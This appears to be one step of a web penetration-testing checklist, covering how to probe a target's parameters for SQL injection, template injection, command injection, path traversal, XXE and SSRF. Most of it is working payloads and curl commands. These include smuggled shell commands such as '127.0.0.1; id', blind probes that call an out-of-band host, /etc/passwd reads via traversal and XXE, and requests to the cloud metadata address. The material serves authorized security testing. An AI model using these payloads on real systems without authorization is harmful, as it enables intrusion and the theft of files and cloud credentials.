# Batch 05 — Injection core

## FILL IN

```bash
T="https://TARGET"
```

## GOAL
Finish **6 checks**: SQLi, SSTI, Command Injection, Path Traversal, XXE, SSRF.  
Use **every interesting param** from batch 00 (not one login box only).

## TIME
2–3 hours

## YOU NEED
- Param list from 00  
- OAST collaborator (for blind SSRF/XXE/cmd)  
- Scope allows invasive probes  

---

## WHY (30 seconds)

**Injection** = your input becomes **code/query/path/URL** on the server.  

| Bug | Server treats input as… |
|-----|-------------------------|
| SQLi | SQL |
| SSTI | Template code |
| Command | Shell |
| Path | File path |
| XXE | XML with external entities |
| SSRF | URL the **server** fetches |

Test **breadth first** (many params, small probes), then go deep on hits.

---

## DO THIS

### 0) Build the queue

From batch 00, every:

```text
?id= ?q= ?search= ?file= ?url= ?template= ?xml= JSON fields
```

### A) SQL Injection

**Detect probes:**

```text
'
"
' OR '1'='1
1 OR 1=1
1'
1 AND 1=1
1 AND 1=2
```

Time-based (if errors hidden):

```text
1; SELECT pg_sleep(5)--
1' AND SLEEP(5)--
```

```bash
# example
curl -sk "https://TARGET/api/items?id=1'" 
curl -sk "https://TARGET/api/items?id=1%20AND%201=1"
curl -sk "https://TARGET/api/items?id=1%20AND%201=2"
```

Compare length/status/time.  
**Win:** syntax error from DB, boolean difference, or time delay.

### B) SSTI (Server-Side Template Injection)

Where name/body is rendered in email or page from template engines:

```text
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
{{config}}
```

**Win:** `49` in response or template error.

### C) Command Injection

Params that smell like host/tools: `ip`, `host`, `filename`, `zip`, diagnostics.

```text
127.0.0.1; id
127.0.0.1|id
127.0.0.1`id`
$(id)
127.0.0.1%0aid
```

Blind:

```text
127.0.0.1; curl http://YOUR-OAST/
127.0.0.1; nslookup YOUR-OAST
```

### D) Path Traversal

File params:

```text
../../../../etc/passwd
....//....//etc/passwd
..%2f..%2fetc/passwd
..%252f..%252fetc/passwd
/etc/passwd
C:\Windows\win.ini
```

```bash
curl -sk "https://TARGET/download?file=../../../../etc/passwd"
```

### E) XXE

On XML / SOAP / SAML / office XML uploads:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "http://YOUR-OAST/xxe">
]>
<foo>&xxe;</foo>
```

File:

```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
```

**Win:** OAST hit or file content in response.

### F) SSRF

Params: `url`, `link`, `path`, `feed`, `webhook`, `destination`, `host`.

```text
http://YOUR-OAST/
http://127.0.0.1:80/
http://169.254.169.254/latest/meta-data/
```

```bash
curl -sk -X POST "https://TARGET/api/fetch" -d 'url=http://YOUR-OAST/'
```

**Win:** OAST callback or internal content.

---

## IF / THEN

| What you saw | What you do |
|--------------|-------------|
| One param hits | Deep-dive that param; do not abandon queue |
| WAF 403 | Encoding / HPP (batch 06) / smaller probes |
| Blind only | OAST + time-based is enough for report |

---

## NEXT
→ [06-upload-hpp-errors.md](./06-upload-hpp-errors.md)
